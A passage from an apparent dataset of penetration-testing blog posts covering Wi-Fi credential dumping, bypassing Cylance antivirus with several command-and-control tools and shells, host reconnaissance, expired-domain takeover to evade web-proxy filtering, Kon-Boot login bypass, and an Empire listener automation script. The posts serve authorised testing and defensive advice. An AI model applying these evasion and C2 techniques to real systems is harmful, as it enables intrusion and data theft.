file for each of the wireless network profiles found on the system. Here is what it found on one of my test machines:\n\nEach of these files contains the SSID and where possible (WEP/WPA-PSK &WPA2-PSK), the passphrase:\n\nThen I tried running the script using an unprivileged account, a \u201cstandard\u201d user in Microsoft lingo. It didn\u2019t work. Interestingly enough an unprivileged user is allowed to successfully dump the wireless profiles including the passwords in cleartext.\n\nSo I modified the payload.txt file like this\u2026.\n\n\u2026.and it worked like a champ!\nNo administrator privilege needed.  I tested this attack against a standard user on a Windows 8 and a Windows 10 machine. I suspect it will work the same way on other versions as well.\nSo how do you prevent this type of attack, er, um, or at least limit the damage?\n\nDon\u2019t use WPA/2-PSK on corporate networks\nDon\u2019t leave workstations unlocked and unattended\nUse full disk encryption to thwart a Konboot lock-screen bypass attack\nDisable USB access on company-owned computers or limit to specific, known devices\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Bypassing Cylance: Part 1 - Using VSAgent.exe\"\nTaxonomies: \"Author, C2, David Fletcher, Red Team, anti-virus, AV, bypassing AV, bypassing Cylance, Cylance, VSAgent.exe\"\nCreation Date: \"Mon, 27 Mar 2017 15:33:25 +0000\"\nDavid Fletcher //\n\nRecently, we had the opportunity to test a production Cylance environment. Obviously, each environment is going to be different and the efficacy of security controls relies largely on individual configuration. However, the posts over the next several days illustrate our observations in one such environment. Different configurations and sound application of defense-in-depth will obviously yield different results.\n\nThis week we will illustrate the techniques that worked for getting command and control communication within the environment. It should be noted that the environment did not have an effective application whitelisting implementation in place during testing. In addition, access to cmd.exe and powershell_ise.exe were not restricted. This series will start with non-traditional C2 channels first.\n\nVSAgent.exe\n\nBHIS has a custom C2 tool called VSAgent (get it at John's 504 DropBox tinyurl.com/504extra2) which uses the ViewState parameter in a well-formed HTML page to communicate commands and their results between the C2 server and client. The ViewState parameter is commonly used in ASP.NET web applications to maintain state between the client and the server. Because this field is so commonly observed and is base64 encoded and optionally encrypted when in legitimate use, it is a difficult target to inspect.\n\nIn this case, the vsagent.exe client was simply downloaded to the target computer and executed.\n\nThe Cylance instance did not detect or prevent the vsagent.exe tool from executing and establishing a C2 channel. Because of this, other compensating controls should be in place to prevent this behavior.  \n\nFor example, web content filtering could be used to prevent download of executable files. However, this can typically be bypassed by downloading the file in a different format or an encrypted/compressed archive then unpacking the file on the target host. Alternatively, a malicious employee or an attacker may deliver a tool like this using removable media.  \n\nA more appropriate countermeasure would be properly implemented application whitelisting. When application whitelists are based on file signatures they are notoriously difficult to bypass and require techniques such as the use of rundll32.exe, installutil.exe, or msbuild.exe.\n\n____\n\nEditor's Note: This is part one of a special week-long five-part series about bypassing Cylance by David. Check back for parts 2-5!)\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Bypassing Cylance: Part 2  Using DNSCat2\"\nTaxonomies: \"Author, C2, David Fletcher, Red Team, anti-virus, AV, AV bypass, Cylance, Cylance Bypass, dnscat2, Pentesting\"\nCreation Date: \"Tue, 28 Mar 2017 14:22:28 +0000\"\nDavid Fletcher //\n\nThe following techniques serve to illustrate methods for obtaining C2 communication in a particular Cylance protected environment.  The configuration of the centralized infrastructure and the endpoint agents were not inspected prior to testing. The environment may exhibit configuration errors and may not conform with best practice for deployment of Cylance infrastructure. However, in our experience, misconfiguration is not uncommon and more times than not tends to have catastrophic results with regard to the overall security posture of an environment. This is the reason that we test deployments before accepting their stated protection levels at face value. In addition, these posts serve to illustrate the necessity for defense-in-depth. In each instance where C2 establishment was successful, a secondary or tertiary control could have (and should have) compensated for the failure of the initial control.  Layered defense is a critical element of protection in any environment and organizations must face the fact that there is no silver bullet for information security. See part one where we used VSAgent.exe  here.\nDNSCat2 (Get this tool on GitHub here)\nDNSCat2 - The next non-traditional Cylance bypass included the use of the DNSCat2 C2 tool. This tool establishes a C2 channel over DNS and queries and responses as its transport mechanism. In this instance, the tool could be executed with default parameters (using encryption) and an initial connection was established. However, the connection was immediately terminated.\n\nHowever, starting the server without encryption resulted in session establishment as seen below.\n\nOnce again, the Cylance tools did not detect execution and C2 channel establishment using this tool. As with VSAgent, execution of this tool could have been halted using properly implemented application whitelisting techniques.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Bypassing Cylance: Part 3 - Netcat & Nishang ICMP C2 Channel\"\nTaxonomies: \"Author, C2, David Fletcher, Red Team, anti-virus, AV, AV bypass, bypassing AV, bypassing Cylance, Cylance, Ncat, netcat, Nishang, Nishang ICMP C2 Channel\"\nCreation Date: \"Wed, 29 Mar 2017 14:48:59 +0000\"\nDavid Fletcher //\n\nThe following techniques serve to illustrate methods for obtaining C2 communication in a particular Cylance protected environment.  The configuration of the centralized infrastructure and the endpoint agents were not inspected prior to testing. The environment may exhibit configuration errors and may not conform with best practice for deployment of Cylance infrastructure. However, in our experience, misconfiguration is not uncommon and more times than not tends to have catastrophic results with regard to the overall security posture of an environment. This is the reason that we test deployments before accepting their stated protection levels at face value. In addition, these posts serve to illustrate the necessity for defense-in-depth. In each instance where C2 establishment was successful, a secondary or tertiary control could have (and should have) compensated for the failure of the initial control.  Layered defense is a critical element of protection in any environment and organizations must face the fact that there is no silver bullet for information security. See part one, bypassing with SVAgent here and part two about bypassing with DNSCat2 here.\nNetcat\nThe third C2 method that went undetected by Cylance was raw netcat. In this case, the listener was a raw netcat shell shoveled outbound. The netcat executable was downloaded to the target host and executed as seen below.\n\nOn the C2 server, netcat was configured to listen on this port for inbound communication. Upon connection from the end host, a Windows shell was returned.\n\nA smart attacker might upload the Nmap port of netcat, named Ncat, which support TLS encryption. This would make the C2 channel all the more difficult to detect.\nUnlike the previous C2 channels, raw netcat C2 does not conform with a specific protocol. In addition to the prior recommendations of filtering downloads and application whitelisting, this communication can be defeated through protocol inspection. If the boundary firewall supports application-level proxies that check for protocol conformance this traffic will be dropped.\nNishang ICMP C2 Channel\nThe final non-traditional method of C2 that went undetected by Cylance was communication using ICMP payloads. In this case, the PowerShell script Invoke-PowerShellIcmp.ps1 from the Nishang framework was used.\nInvestigating the deployed configuration of Cylance revealed that it was configured to prevent execution of any content through the native PowerShell.exe interpreter.\n\nHowever, the PowerShell ISE was available on this host. As a result, the script could be loaded into the ISE and its functions exposed by either clicking the play button or using the familiar import-module syntax. In this instance, the play button was used.\n\nOnce the PowerShell script was loaded, it was invoked as seen below.\n\nThe waiting C2 server caught the callback from the client granting shoveled shell access to the target computer.\n\nIn this case, the organization can make a decision regarding ICMP in general. If users don\u2019t need to ping hosts on the internet, the organization can simply drop all outbound ICMP messages from internal hosts.\nWhile PowerShell ISE worked fine for this script, it should be noted that any script that includes embedded calls to the native PowerShell interpreter should be avoided. In addition, multi-threaded scripts may exhibit this same issue if the native interpreter is referenced.\nThe following PowerShell scripts were found to work when launched through the PowerShell ISE.\nDomainPasswordSpray.ps1\nInvoke-Kerberoast.ps1\nInvoke-PowerShellICMP.ps1\nPowerView.ps1\nPowerUp.ps1\nThe CylancePROTECT script control module only blocked calls to the native interpreter.\nAccess to both cmd.exe and PowerShell_ise.exe should be restricted in the same fashion seen for PowerShell.exe. Both of these tools provide enormous capability to an attacker for pivoting within an environment.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Bypassing Cylance: Part 4 - Metasploit Meterpreter & PowerShell Empire Agent\"\nTaxonomies: \"Author, C2, David Fletcher, Red Team, anti-virus, AV, bypassing AV, Cylance, Cylance Bypass, metasploit meterpreter, PowerShell, PowerShell Empire Agent\"\nCreation Date: \"Thu, 30 Mar 2017 15:26:19 +0000\"\nDavid Fletcher //\n\nThe following techniques serve to illustrate methods for obtaining C2 communication in a particular Cylance protected environment.  The configuration of the centralized infrastructure and the endpoint agents were not inspected prior to testing. The environment may exhibit configuration errors and may not conform with best practice for deployment of Cylance infrastructure. However, in our experience, misconfiguration is not uncommon and more times than not tends to have catastrophic results with regard to the overall security posture of an environment. This is the reason that we test deployments before accepting their stated protection levels at face value. In addition, these posts serve to illustrate the necessity for defense-in-depth. In each instance where C2 establishment was successful, a secondary or tertiary control could have (and should have) compensated for the failure of the initial control.  Layered defense is a critical element of protection in any environment and organizations must face the fact that there is no silver bullet for information security. Don't miss part 1, using VSAgent, part 2 about using DNScat2, and part 3 where David used Netcat and Nishang\n\nAfter establishing successful C2 communication with several different tools using various protocols, two more traditional payloads were attempted. The first was Metasploit\u2019s Meterpreter and the second was a PowerShell Empire Agent.\n\nBefore diving into the details of each of the agents, it was necessary to get PowerShell interpreter access on the target host. Surprisingly, the method that worked was renaming the native PowerShell.exe interpreter. After renaming the executable, Cylance no longer prevented execution of PowerShell within this environment.\n\nMetasploit Meterpreter\n\nThe Cylance agent was very effective at detecting and eradicating instances of Metasploit Meterpreter. The Meterpreter payload (32-bit and 64-bit) was delivered to the target host both in both unencoded and encoded forms, with stage encoding enabled, in the following package formats and a resulting shell was never achieved.\n\nStaged Meterpreter Msfvenom Payload\n\nStaged Meterpreter Msfvenom Payload using Alternate EXE Template\n\nStageless Meterpreter Msfvenom Payload\n\nDLL injection using RunDLL32.exe\n\nUninstall execution using InstallUtil.exe\n\nPowerShell execution using \u201cPowerShell without PowerShell\u201d technique\n\nModified Unicorn PowerShell payload**\n\nImport-ShellCode and Inject-ShellCode\n\nSeveral PowerShell payloads were attempted. However, many of the Metasploit payloads make subsequent calls to the native PowerShell interpreter. These payloads were decoded, modified and re-encoded to use the renamed PowerShell interpreter. However, each time the PowerShell was executed, the ensuing process was blocked by Cylance. This same response was observed for each of the Meterpreter payloads delivered to the host.\n\nIn the interest of time, other less powerful Metasploit payloads were not attempted.\n\nPowerShell Empire Agent\n\nAfter gaining access to the native PowerShell interpreter by renaming the executable, PowerShell Empire agent C2 could be obtained with minimal modification.\n\nFirst, the launcher stager PowerShell payload was generated as seen below.\n\nThen the interpreter was altered to match the renamed interpreter on the host.\n\nAfter execution, a PowerShell Empire agent callback was observed from the target host.\n\nThis initial agent was executed with the default listener properties provided by PowerShell Empire. The beaconing behavior (five-second intervals) was identified by Cylance and prevented after roughly three hours of agent communication.\n\nHowever, the communication profile of the agent was altered to include jitter and requests to non-default resources as described in this blog post by Carrie Roberts. With the agent configured to communicate in this manner, the C2 channel went undetected for more than 24 hours.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Bypassing Cylance: Part 5 - Looking Forward\"\nTaxonomies: \"Author, C2, InfoSec 201, John Strand, Red Team, anti-virus, AV, Cylance, industry trends\"\nCreation Date: \"Thu, 30 Mar 2017 22:49:14 +0000\"\nJohn Strand//\n\nWe just finished up a walk through of how we bypassed Cylance in a previous engagement. To conclude this exciting week, I want to share a few comments and notes with everyone.\nFirst, we are a penetration testing firm. We test what customers give us to test. We do not test what the vendor wants us to test. We test where the rubber meets the road. \nSome have pointed out that the techniques we used were basic. Yes, many of the techniques we used were extremely rudimentary. But they worked! This, in and of itself, calls into question the validity of the marketing claims AV companies sometimes make. \nLet's take a few moments and talk about those marketing claims and the NSS reports. Why is it that companies like Cylance and CrowdStrike are so insane when it comes to people publicly testing their products? Why is it that a small testing firm in South Dakota would be one of the only sources of information people have about a product\u2019s limitations. \nI want to apologize to Cylance for putting them in the same category as CrowdStrike. Cylance has not threatened litigation yet. Like CrowdStrike, they have insane EULA restrictions regarding the discussion, review, or independent analysis of their products. This would be like Chevy/Ford/Toyota threatening to sue Car & Driver or Consumer Reports anytime there was an unbiased investigative article written about one of their vehicles. Would these same car companies hunt down customers of vehicles who wrote blogs and posted on bulletin boards with negative experiences? Can you imagine if Cylance/Symantec/Oracle/Microsoft were hunting down customers who said bad things about them? That would be insane - Orwellian!\nCylance is far better than most traditional blacklist AV products. When we test a company, we try multiple types of malware and Command and Control (C2). This is so we can properly identify what the endpoint security tool can and cannot detect. There are a number of cases we expect to be detected, but seldom are with traditional blacklist AV. With this test, there were a number of cases where Cylance shined as compared to traditional AV. There were a number of cool things that Cylance did detect. It\u2019s far harder to redact that information. But trust me... They are better than most traditional AV.\nThere\u2019s always people who rightfully point out that whitelisting was not enabled and it would stop most (if not all) of the techniques we used. We can\u2019t say enough positive things about whitelisting. It\u2019s one of the single greatest defenses an organization can deploy. But it\u2019s not magic that is held exclusively by Cylance or any other vendor. It\u2019s something that can be deployed via Applocker or SRP via group policy - albeit not without significant administrative overhead. Thus,  claiming a security product didn\u2019t do well because whitelisting wasn\u2019t enabled is invalid.\nThe point is, whitelisting is free. It is not, cannot, and will never will be a \"feature\" in one product alone. All vendors have special options and configurations which are great, but rarely implemented in the real world. \nThere are features in many endpoint security products which would shut down most attacks. Typically, these features are never fully enabled/deployed. Is it because the product\u2019s flawed? Not necessarily. Often these features are disabled because they can decrease work productivity or have unexpected IT administrative costs, consequently reducing the effectiveness of the security solution. \nThe industry wants security products to simply work with little to no interaction. They want the easy button. \nCylance makes fantastic claims about Artificial Intelligence and how they\u2019re going to render all other AV obsolete. Even being able to predict future attacks! I want to believe this, I really do\u2026 but, from what we\u2019ve seen those claims are still a ways down the road. I will say, this product has a brilliant concept, it is a step in the right direction; though perhaps rushed to market before reaching butcher weight. \nSo what can we learn from this? A couple of things. \nFirst, this highlights a need for more comprehensive, unbiased testing of security products. We\u2019ve seen reports, like the recent NSS Labs reports, which leave substantial room for improvement.\nSecondly, there is still no silver bullet. This industry\u2019s marketing capitalizes on silver bullets to solve our fear of vampires but there\u2019s no such simple solution. There\u2019s no way even Cylance is the be-all, end-all solution that marketing claims, at least for now - there are many brilliant minds hard at work in the back room. \nIn conclusion, if there isn\u2019t a silver bullet, what do we need? Architecture. We should be looking at whitelisting for applications and egress internet access.\nDo not, under any circumstances, believe that moving to whitelisting or an advanced endpoint product is going to be an easy fix. You will need to work to properly implement it. You will need to have more staff on hand to keep these products fed and happy.\nEvery time you hit the easy button, God deploys another bot on your network. \nStop. Hitting. The. Easy. Button.\n \nFrom South Dakota with love,\nJohn\n______\nMuch of what we did was based on the existing research of Casey Smith and @_TacoRocket. Read Colby Farley's blog here:\nhttps://pwningroot.com/\n*and the previous blog of Casey Smith\nThey\u2019re truly fantastic and should be mined for tips, tricks and hints anytime you\u2019re testing an advanced endpoint security product.\n \n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"HostRecon: A Situational Awareness Tool\"\nTaxonomies: \"Author, Beau Bullock, Recon, Red Team, Red Team Tools, HostRecon, PowerShell, Situational Awareness, tool\"\nCreation Date: \"Tue, 04 Apr 2017 14:04:42 +0000\"\nBeau Bullock //\n\nOverview\nHostRecon is a tool I wrote in PowerShell to assist with quickly enumerating a number of items that I would typically check after gaining access to a system. It can assist in providing situational awareness to a penetration tester during the reconnaissance phase of an engagement. It gathers information about the local system, users, and domain information. Probably the most important thing about it is that it does not use any 'net', 'ipconfig', 'whoami', 'netstat', or other system commands. I've had some security products alert on the use of those common commands/tools. Instead, those commands have been replaced with PowerShell and WMI queries.\nOn many pentests we are still seeing Windows 7 systems that only have PowerShell version 2.0 installed. To assist with backward compatibility for these systems I\u2019ve avoided using many of cmdlets available in PowerShell version 3.0 and up that would have provided the functionality I needed.\nCommon Security Product Detection\nI wanted a tool that had the ability to help quickly identify security products in use on a system. HostRecon attempts to enumerate common security products on the system including AV, IDS, AppWhitelisting, Behavioral Analysis, etc. This will be an ever-changing/ever-growing list that I will attempt to keep as updated as possible. I\u2019ve asked my colleagues at BHIS to help me grow this list of security products by sending me any new processes and product names they see on pentests.\n\nSituational Awareness\nHostRecon provides information from a target system that will assist a pentester in crafting further attacks. Prior to blindly running payloads on a system it\u2019s good to know what security protections are in place. Is the system running application whitelisting? Is there a web proxy in use for Internet traffic? Is the local administrator\u2019s password possibly randomized? HostRecon will attempt to answer some of these questions. Having a good situational awareness prior to moving forward should increase your chances of success.\n\nHere is a full list of things it currently checks:\n\nCurrent Hostname - Gathers the hostname of the local system\nIP Information - Gathers IP info; Alternative for \u2018ipconfig\u2019\nCurrent Username - Gathers current username; Alternative for \u2018whoami\u2019\nCurrent Domain Name - Gathers current domain name\nAll Local Users - Gathers local users from the system; Alternative for \u2018net users\u2019\nLocal Admins Group - Gathers local admins group members; Alternative for \u2018net localgroup administrators\u2019\nNetstat Information - Gathers listening and established connection info; Alternative for \u2018netstat\u2019\nDNS Cache Information - Gathers DNS cache information; Alternative for \u2018ipconfig /displaydns\u2019\nShares - Gathers Share info; Alternative for \u2018net use\u2019\nScheduled Tasks - Gathers any scheduled tasks from the system; Alternative for \u2018schtasks\u2019\nWeb Proxy Information - Determines if a web proxy is in use\nProcess Listing - Lists out all current running processes on the system\nAntiVirus Information - Checks if AV is enabled and what product is running\nFirewall Status - Determines if the local firewall is enabled or not\nLocal Admin Password Solution (LAPS) - Attempts to locate the DLL used when installing LAPS.\nDomain Password Policy - Gathers the domain account password policy\nDomain Admins Group Members - Lists the members of the Domain Admins group\nDomain Controllers - Lists any Domain Controllers\nChecks for Common Security Products - Analyzes the process listing for common security product processes and names\n\nEgress Filter Check\nInvoke-HostRecon also includes a functionality for assessing egress filtering from the system. The -Portscan flag can be passed to initiate an outbound portscan against allports.exposed to help determine open ports allowed through an egress firewall. (Credit for the Portscan module goes to Joff Thyer). By running 'Invoke-HostRecon -Portscan' it will perform an egress check against allports.exposed as well.\n\nUsage\nHostRecon can be downloaded here: https://github.com/dafthack/HostRecon\n\nStart a PowerShell session on a system\n\nC:>powershell.exe -exec bypass\n\nImport the script\n\nPS C:>Import-Module HostRecon.ps1\n\nRun HostRecon\n\nPS C:>Invoke-HostRecon\nTo perform an egress filter check on the top 100 ports run the following command:\nPS C:> Invoke-HostRecon -Portscan -TopPorts 100\nIf you have any other ideas that you would like added into HostRecon please shoot me an email, contact me on Twitter (@dafthack), or open an issue on Github. Please keep in mind I am avoiding the use of any system tools (\u2018ipconfig\u2019, \u2018net\u2019, \u2018netstat\u2019, \u2018arp\u2019, etc\u2026) and also avoiding any PowerShell 3.0 and up cmdlets.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Bypass Web-Proxy Filtering\"\nTaxonomies: \"Author, Brian Fehrman, Red Team, Red Team Tools, Bypassing Web-Proxy Filtering, C2 Channels, penetration testing, Pentesting, PowerShell, Web-Proxy Filtering\"\nCreation Date: \"Thu, 13 Apr 2017 15:45:20 +0000\"\nBrian Fehrman //\n\nSomeone recently posed a question to BHIS about creating C2 channels in environments where heavily restrictive egress filtering is being utilized. Testers at BHIS, and in the industry as a whole, routinely run into this type of scenario. BHIS strongly encourages the use of egress filtering. As with many other security approaches, however, it is important to realize that this is just one piece of the overall security puzzle. \n\nThere are multiple ways to get around heavy egress-filtering (thanks to Beau for the links and insights in this section). In some cases, tools such as ICMPSploit [1] can be used to create C2 channels using the ICMP protocol. DNScat is a well-known tool that utilizes DNS requests and responses for C2 traffic. For this blog, we are going to focus solely on environments that are only allowing web-based traffic in and out of the environment. We will place an additional restriction on this scenario and assume that the environment also uses web-proxy filtering. It\u2019s becoming more common to see companies not only block known bad sites but also block access to sites that have not received a categorization (e.g., Shopping, Financial, Sports, etc.) Even in this type of environment, there are numerous ways to establish C2 channels. Some of the methods include leveraging Gmail [2] and Outlook [3]. Domain-fronting via CDN services is also becoming increasingly popular [4].\n\nI would like to focus on a web-proxy filtering bypass method that is known as domain-categorization take-over (thanks to harmj0y for the idea). I will walk you through the process of getting your own categorized domain and talk about some of the ways you can utilize it.\n\nThe first step is to find a recently expired domain that received a \u201cgood\u201d categorization before it expired. The idea is that if you re-register a domain shortly after its previous owner failed to renew it, the categorization that was given to that domain will remain intact. How do we go about doing that? Easy!! Head on over to the site located at https://www.expireddomains.net. Now, you can use this service without signing up for anything. I suggest taking just a few minutes to sign up for a free account. With a registered account, you are afforded access to a lot more content than you do if you just browse anonymously. After logging in, you should see something similar to the screenshot below. I\u2019ve highlighted the main area of interest. Click on one of the domain suffixes (e.g., \u201cDeleted .info Domains\u201d). The .com sites will likely be the most expensive to register. I typically go for .info, which can usually be bought for about $1/year.\n\nAfter clicking a Deleted Domain suffix, you will be taken to a page that shows recently expired domains with that suffix and a lot of information to go along with it. What does all of it mean? Well, I will talk about what I feel are the most important statistics. First, click on the \u201cShow Filter\u201d option.\n\nThe first thing that I like to do is to check the \u201cno Adult Names\u201d box. We don\u2019t pass judgment here, but web-proxy filters sure do! Next, I check the \u201conly available Domains\u201d box to ensure that domains that are currently registered do not appear in the list. The last change that I make is to select the \u201cSimilarWeb Top Country\u201d to be the country in which my target resides. This can help to reduce the suspicion of web-proxy filters. Once you\u2019re satisfied with the filter options, click the \u201cApply Filter\u201d button towards the bottom of the page.\n\nNext, click on the \u201cSimilarWeb\u201d heading to sort the expired domains by their SimilarWeb ranking. Essentially, the lower the number the more \u201creputable\u201d the site. Once I\u2019ve applied the sorting, I start clicking through the SimilarWeb rating for the domains until I find one that has been assigned a category. In this case, clicking the SimilarWeb link for gtavdata.info shows that this site was categorized as \u201cReference->Maps\u201d site. Seems innocuous enough for our needs!\n\nNow that we\u2019ve found a suitable categorized-domain, we need to register it. I suggest using https://www.namesilo.com since it has a nice interface, seems to keep the domain categorization intact, and provides free WHOIS privacy. We don\u2019t need hosting or anything fancy, just something to register the domain and set the A record for the domain. NameSilo also makes it easy to set up Office 365 Mail with your domain but that is a discussion for another blog post. Just type in the name of the domain that you found in the previous step and register away. Make sure to pick the correct domain extension (e.g., .info, .com, .net, etc.) or else the trick likely won\u2019t work.\n\nAfter registering the domain name, sign in to namesilo.com and head to the DNS settings for that domain. The sequence of images below shows the general steps to get there.\n\nOnce you\u2019ve found the DNS settings, click the edit button next to the first A record in the list. Change the IP address of that A record to be the IP address of your C2/testing server and then click submit button.\n\nNext, delete the other three default DNS records that NameSilo created for you so that you are left with only the A record that you just edited in the previous step.\n\nNow, we patiently wait for the A record changes to propagate to the public. Namesilo.com seems to propagate the changes within fifteen minutes in most cases. Keep checking for the update by using your favorite DNS resolution tool against your new domain. In the image below, you can see that I\u2019ve used dig to verify that gtavdata.info now points to my C2 server.\n\nThe next step that I usually take is to generate a valid, signed SSL-certificate for the new domain. Having a trusted certificate to use for encrypting your traffic will add to the ability to bypass traffic-filtering mechanisms, help protect any sensitive data that might be transferred, and it can also evade some anti-virus tools that would otherwise see the unencrypted payload coming across the network. I suggest logging into your C2 server and then checking out Carrie\u2019s awesome blog post on how to do this quickly and for free! [5]\n\nAfter generating your shiny-new SSL certificate, you\u2019re ready to use your categorized domain-name for testing! Continue reading Carrie\u2019s post to see how to use your domain with PowerShell Empire.\n\nYou can also use your certificate and categorized domain with meterpreter and metasploit. Below is an example of using msfvenom to generate an HTA payload for my domain.\n\nBefore starting a listener for meterpreter, you might want to host your payload so that you can transfer it into your testing environment. You might also have other tools that you\u2019d like to have on your testing system for the assessment. Apache is one easy way to do this that takes advantage of your certificate and domain. One suggestion is to create a folder in the /var/www/html directory on your system. For this example, let\u2019s call it serverfolder.\n\nmkdir /var/www/html/serverfolder\n\nCopy your payload file and other tools to the directory that you just created. After copying the files, make sure that the Apache service is running. In the image below, I\u2019ve copied the met_pay.hta payload file and the PowerLine toolset (teaser:upcoming webcast!) to my serverfolder directory.\n\nYou can now reach your files by opening a web browser and typing https://yourdomainname.net/serverfolder.\n\nThe next task we will do is to create a listener for our meterpreter payload. After downloading the files to your testing system, kill the Apache service on your server and start-up msfconsole.\n\nIssue the commands shown in the screenshot below. Make sure to replace the handlersslcert value with the path to your certificate file.\n\nHead back to the testing system on which you downloaded the payload and run it. Head back over to your server and enjoy the new session that was created using your categorized domain and signed SSL-certificate.\n\nFollow Brian on the Twitters: @fullmetalcache\n\nShout-outs: Carrie Roberts, Sally Vandeven, Derek Banks, Beau Bullock, harmj0y (and APT team), and others that I\u2019m probably forgetting\u2026\n\n[1] http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-5.html\n\n[2] https://github.com/byt3bl33d3r/gcat\n\n[3] https://github.com/colemination/PowerOutlook\n\n[4] https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/\n\n[5] http://www.blackhillsinfosec.com/?p=5447\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Super Sweet Kon-Boot Demo in GIFs\"\nTaxonomies: \"Author, Jordan Drysdale, Kent Ickler, Red Team, Red Team Tools, Kon-Boot, thumb drive fun\"\nCreation Date: \"Tue, 11 Apr 2017 16:34:41 +0000\"\nJordan Drysdale, victim //\nKent Ickler, adversary //\nIn this post, our victim locks their computer and heads out for a coffee refill. The adversary smashes through all system and user defenses. \n[embed]http://gph.is/2omMyIb[/embed]\nWith the system locked and the user not defending her PC/Laptop/MacBook, the adversary has Kon-Boot 2-in-1 installed on a USB drive, plugs it in and reboots. http://www.piotrbania.com/all/kon-boot/\n[embed]http://gph.is/2ooOPnW[/embed]\nKon-Boot is as simple as a BIOS boot to a thumb drive. The installer is also dead simple and takes about 30 seconds from scratch to weaponized thumb drive. \nThe adversary runs through BIOS options and chooses to boot to the thumb drive.\n[embed]http://gph.is/2omPgNP[/embed]\nKon-Boot does one of two things for bypassing the password screen. It can be run in bypass mode (note the following one character entry, plus a carriage return). Or, Kon-Boot can be run in \u2018New User\u2019 mode and a root or Kon-Boot user will be created and added to local administrators.\n[embed]http://gph.is/2p43cwt[/embed]\n \nThat\u2019s it, the adversary is in, can fetch data, run the Bash Bunny for data exfiltration, Wi-Fi profile recovery or just dump files with standard Windows drag and drop.\n[embed]https://giphy.com/gifs/transfers-1fkrfmfvyEXug[/embed]\nFinally, the adversary can pull the USB, lock, reboot, do whatever. After the reboot, aside from the missing open programs, files or what-have-you, the user is unaware of any trespass.\n[embed]http://gph.is/2op9NmL[/embed]\nKon-Boot is a must have in every Pentester's Go Kit.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Empire Bootstrapping v2 - How to Pre-Automate All the Things!\"\nTaxonomies: \"Author, C2, Kent Ickler, Red Team, automation, automation tools, Kent Ickler, PowerShell Empire, robot with boots, Screen\"\nCreation Date: \"Wed, 19 Apr 2017 16:34:51 +0000\"\nKent Ickler //\n\nA robot wearing boots... with straps....\n\nHave you been tasked with automation in the Command and Control (C2) world? If so your goal is to shorten the overhead time on repetitive tasks related to procuring a valid control channel. This wasn\u2019t my first rodeo in mundane automation and finding creative shorthand. Automating automated tools usually comes without too many headaches. It's amazing how a little time in a script can potentially save staff HOURS and even WEEKS of work.  \n\nI\u2019m still surprised though, Powershell Empire does not directly accept command line arguments to launch a predefined listener (albeit it includes an API).  The challenge to automate attended Powershell Empire configuration was already presented by Carrie in this blog post.  The previous work used Screen to create a new shell session \u201cwindow\u201d and cast in the appropriate commands.  With a couple of small changes to Carrie\u2019s work, a Powershell Empire bootstrap is created for unattended deployment and teardown.\n\nReview of Screen:\n\nScreen allows for multiple retained sessions within a Linux system. Casting the Powershell Empire directly into a new Screen without attaching the screen causes Empire to be actively loaded in the background of the current session. Screen\u2019s feature allows passing commands into the new session from the existing session, allowing a shell script to mimic an attended session with input.\n\nUnattended Powershell Empire bootstrap:\n\nThe following script casts a Powershell Empire instance into a new Screen session, sends the necessary commands to that Session to clear all existing listeners and the commands to create a new listener. The last command (commented out for unattended utility) attaches the user to the new Empire session. Attaching to the new session is optional, however, since Empire could now be interactively controlled via scripting from other sources/scripts. The syntax to send commands to the Empire instance are pretty apparent here and modifying to fit your needs for automation or unattended needs should be pretty easy.\n\n#You\u2019ll need sudo for Empire:\n\nsudo -s\n\n#Don\u2019t forget your +x flag!\n\nchmod +x Empire_Listener_443.sh\n\n.\\Empire_Listener_443.sh\n\nCarrie had set most of this work in motion last year, with a couple of small updates it becomes unattended and automated.  Thanks Carrie!\n\nEmpire_Listener_443.sh\n\n#Clear any Existing empire Screen sessions\n\nscreen -X -S Empire Quit\n\n# Launch Empire and wait a few seconds while it starts and brings user to prompt.\n\ncd /directory/to/Empire\n\nscreen -S Empire -d -m /directory/to/Empire/empire\n\nsleep 5\n\n#Send unattended commands to the Empire instance\n\nscreen -S Empire -X stuff \u2018listeners\\r\u2019\n\nscreen -S Empire -X stuff \u2018kill all\\r\u2019\n\nscreen -S Empire -X stuff \u2018y\\r\u2019\n\nscreen -S Empire -X stuff \u2018set Name OurListener\\r\u2019\n\nscreen -S Empire -X stuff \u2018set Port 443\\r\u2019\n\nscreen -S Empire -X stuff \u2018execute\\r\u2019\n\nscreen -S Empire -X stuff \u2018back\\r\u2019\n\nscreen -S Empire -X stuff \u2018listeners\\r\u2019\n\nEcho \u201c***Connect to this Empire session with \u2018screen -S Empire -R\u2019\u201d\n\nThis leaves the Empire listener running in the background session and the appropriate command to connect to the listener control menu.\n\nAttended Powershell Empire bootstrap\n\nNow, to take it one more step, this short script can be turned into a bootstrap that will launch Empire and Attach you into a session with the command line argument(s) you provide.\n\n#You\u2019ll need sudo for Empire:\n\nsudo -s\n\n#Don\u2019t forget your +x flag!\n\nchmod +x EmpListener.sh\n\n./EmpListener.sh [listener-name] [port number]\n\n/.EmpListener.sh OurListener 443\n\nEmpListener.SH:\n\n#Clear any Existing empire screen sessions\n\nscreen -X -S Empire Quit\n\n# Launch Empire and wait a few seconds while it starts and brings user to prompt.\n\ncd /directory/to/Empire\n\nscreen -S Empire -d -m /directory/to/Empire/empire\n\nsleep 5\n\n#Send unattended commands to the Empire instance\n\nscreen -S Empire -X stuff \u2018listeners\\r\u2019\n\nscreen -S Empire -X stuff \u2018kill all\\r\u2019\n\nscreen -S Empire -X stuff \u2018y\\r\u2019\n\nscreen -S Empire -X stuff \u2018set Name \u2018$1\u2019\\r\u2019\n\nscreen -S Empire -X stuff \u2018set Port \u2018$2\u2019\\r\u2019\n\nscreen -S Empire -X stuff \u2018execute\\r\u2019\n\nscreen -S Empire -X stuff \u2018back\\r\u2019\n\nscreen -S Empire -X stuff \u2018listeners\\r\u2019\n\n#Attach to the new screen session (optional)\n\nscreen -S Empire 